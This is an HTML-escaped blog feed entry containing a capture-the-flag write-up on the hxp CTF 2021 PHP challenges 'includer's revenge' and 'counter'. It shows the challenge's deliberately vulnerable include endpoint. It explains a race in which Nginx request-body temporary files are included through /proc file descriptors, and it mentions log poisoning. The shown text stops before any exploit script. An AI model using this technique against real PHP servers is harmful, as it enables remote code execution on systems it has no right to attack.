                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;In December 2021 Eyal Daniel and me (Guy Lewin) participated in &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;2021.ctf.link&amp;#x2F;&amp;quot;&amp;gt;hxp CTF 2021&amp;lt;&amp;#x2F;a&amp;gt; on behalf of &amp;quot;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;ctftime.org&amp;#x2F;team&amp;#x2F;6965&amp;quot;&amp;gt;pasten&amp;lt;&amp;#x2F;a&amp;gt;&amp;quot; group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenges&amp;quot;&amp;gt;The Challenges&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The recent hxp CTF brought us some great challenges, 2 of those challenges were &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; - hard and medium web-challenges respectively.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;While trying to solve &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; we managed to find an awesome and incredibly hard to exploit solution that was also working on the second challenge (&amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;). Both of these challenges are based on the &amp;lt;code&amp;gt;LFI (Local File Inclusion)&amp;lt;&amp;#x2F;code&amp;gt; concept, like familiar challenges from previous years. &amp;lt;code&amp;gt;LFI&amp;lt;&amp;#x2F;code&amp;gt; is a highly documented and known category of vulnerabilities and this year’s challenges are making it a bit harder to exploit than usual.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;includer-s-revenge&amp;quot;&amp;gt;includer’s revenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;&amp;amp;lt;?php &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;action&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;read&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;read&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;readfile&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;file&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;index.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) : &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;include_once&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;file&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;index.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;A very basic PHP endpoint that either reads a file, or includes it. The typical challenge is creating a local file on the server that contains a malicious PHP code. There are many documented methods to do this, the most naive one is simply using an existing upload mechanism in the targeted website. Given the simplicity of this challenge (the above code is the entire logic behind the target server) - we need a different kind of approach.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;environment-caches-sessions-and-what-not&amp;quot;&amp;gt;Environment, Caches, Sessions and What Not&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;This kind of approach takes advantage of dynamically generated files that are created in various ways using different features and situations in the underlying framework and environment. For example - inserting a log record to a running application’s log file might actually make the log file a valid PHP page! Imagine browsing to &amp;lt;code&amp;gt;&amp;#x2F;&amp;amp;lt;?php ... ?&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;, suddenly - the Nginx log file can be included and trigger logic controlled by the attacker.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-hardened-setup&amp;quot;&amp;gt;The Hardened Setup&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;On top of the source code - we are also given the &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; for creating a local instance of the challenge. Below is the &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; used in &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt;, the difference between it and &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;‘s is irrelevant for our exploit.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN chown -R root:root &amp;#x2F;var&amp;#x2F;www &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;find &amp;#x2F;var&amp;#x2F;www -type d -exec chmod 555 {} &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;find &amp;#x2F;var&amp;#x2F;www -type f -exec chmod 444 {} &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;chown -R root:root &amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;sessions &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;chmod -R 000 &amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;sessions
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN ln -sf &amp;#x2F;dev&amp;#x2F;stdout &amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;access.log &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ln -sf &amp;#x2F;dev&amp;#x2F;stderr &amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;error.log
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN find &amp;#x2F; -ignore_readdir_race -type f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; -perm -4000 -o -perm -2000 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; -not -wholename &amp;#x2F;readflag -delete
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;We notice several things when looking at the file. PHP doesn’t have permissions to write into its sessions directory, which prevents us from setting a PHP session with malicious code into a session file. In addition, when PHP creates temporary files (for buffering, or &amp;lt;code&amp;gt;php:&amp;#x2F;&amp;#x2F;temp&amp;lt;&amp;#x2F;code&amp;gt; for example) it runs the &amp;lt;code&amp;gt;php_get_temporary_directory()&amp;lt;&amp;#x2F;code&amp;gt; function to resolve the temp directory. Sadly, in this setup the result is always &amp;lt;code&amp;gt;&amp;#x2F;tmp&amp;lt;&amp;#x2F;code&amp;gt;. Since PHP can’t write into it (see &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; above) - we didn’t go in this direction.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;On top of that - Nginx’s log files are redirected to &amp;lt;code&amp;gt;stdout&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;stderr&amp;lt;&amp;#x2F;code&amp;gt; which means that there are no logs on the filesystem (i.e. we can’t use Nginx access &amp;#x2F; errors to write malicious code into a file).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;ignoring-the-obvious&amp;quot;&amp;gt;Ignoring the Obvious&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When you’re doing enough challenges, you learn to spot the important parts of the challenge - the little clues that are right in front of you, the configuration that should not be there, the misplaced &amp;lt;code&amp;gt;&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;, the unusual choice of words in the description.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;... readfile($_GET[&amp;amp;#39;file&amp;amp;#39;] ?? &amp;amp;#39;index.php&amp;amp;#39;) : include_once($_GET[&amp;amp;#39;file&amp;amp;#39;] ...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The challenge consists of two major parts - &amp;lt;code&amp;gt;readfile()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt;. At first sight, it seems like we were meant to leverage &amp;lt;code&amp;gt;readfile()&amp;lt;&amp;#x2F;code&amp;gt; for somehow placing a file and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; to execute it. Having said that, completely aware of the path we’re supposed to walk in, we chose to go in a completely different way.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-pasten-way&amp;quot;&amp;gt;The Pasten Way&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;There is nothing like solving a challenge in an unintended way! Trying to find different types of dynamic files, we decided to look into Nginx as a target. The first Google result for &amp;lt;code&amp;gt;&amp;quot;nginx tempfile&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; was actually a breakthrough, revealing Nginx &amp;lt;strong&amp;gt;does&amp;lt;&amp;#x2F;strong&amp;gt; create temporary files (mainly because people were complaining about permission errors).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When we read more about it, we found the following documentation:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;client_body_buffer_size:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Sound good doesn’t it? Testing this behavior was a little tricky since we never actually saw these files on the filesystem. This behavior can be easily explained when looking at the relevant source code in Nginx:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;c&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-c &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-c&amp;quot; data-lang=&amp;quot;c&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ngx_open_tempfile(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;u_char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;name, ngx_uint_t persistent, ngx_uint_t access)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    ngx_fd_t  fd;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;open((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;const char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) name, O_CREAT&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;O_EXCL&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;O_RDWR,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;              access &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;?&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; access &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0600&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;!= -&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;persistent) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        (&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;void&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unlink((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;const char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) name)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; fd;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;As you can see, the temporary file is created, then &amp;lt;strong&amp;gt;immediately&amp;lt;&amp;#x2F;strong&amp;gt; deleted! This is a hell of a race to win. Nevertheless we decided to go for it.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The temporary file name will be a (10 digit 0-padded) sequential number that isn’t really predictable (it’s directly based on the number of previously handled buffered bodies at the time the request is processed).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Luckily - we can use &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; to access these files through the open file descriptors of the Nginx worker processes! In order to easily test this behavior we simply generated a request that is larger than &amp;lt;code&amp;gt;16K&amp;lt;&amp;#x2F;code&amp;gt; and made sure to keep the request going - sending the data byte by byte to leave the &amp;lt;code&amp;gt;fd&amp;lt;&amp;#x2F;code&amp;gt; open.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The weird thing about file descriptors in procfs is that they (in a way) behave both as symlinks and hardlinks. If a file was deleted while a process holds an open file descriptor:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;realpath()&amp;lt;&amp;#x2F;code&amp;gt; will return the last path of the file with &amp;lt;code&amp;gt;&amp;quot; (deleted)&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; appended to it.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;open()&amp;lt;&amp;#x2F;code&amp;gt; will return an &amp;lt;code&amp;gt;fd&amp;lt;&amp;#x2F;code&amp;gt; that can be used to read the original file content.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Using this method we could potentially use the Nginx file descriptor to access the temporary file and include its content (which is completely controlled by us).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Unfortunately, PHP identifies the file descriptor as a symlink and thus attempts to resolve it’s link, as shown in the &amp;lt;code&amp;gt;php-core&amp;lt;&amp;#x2F;code&amp;gt; snippet below:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;c&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-c &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-c&amp;quot; data-lang=&amp;quot;c&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;++&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ll) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; LINK_MAX &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;size_t&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;php_sys_readlink(tmp, path, MAXPATHLEN)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;size_t&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;...    
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This means that PHP has to resolve the link and open the file between the creation and deletion of the temporary file by Nginx (which, as shown above, is literally 2 lines of code apart).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So, the optimists will claim that a race is a race and it’s always exploitable (and they will be right!). Sadly, it’s not that easy.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;While attempting to exploit, we noticed that after resolving a link - PHP caches the resolution by default.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&amp;#x2F;1.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;This is important because realistically, we will fail &amp;lt;em&amp;gt;many&amp;lt;&amp;#x2F;em&amp;gt; times before winning the Nginx open + delete race. If we loop through every file descriptor number before succeeding, we are inserting the broken links to the cache and thus preventing us from accessing this file descriptor number again. When PHP resolves a link to a deleted file, it puts its path + &amp;lt;code&amp;gt;&amp;quot; (deleted)&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; in the cache, and will not try to resolve it again until the TTL or the cache size has been exceeded.&amp;lt;&amp;#x2F;p&amp;gt;
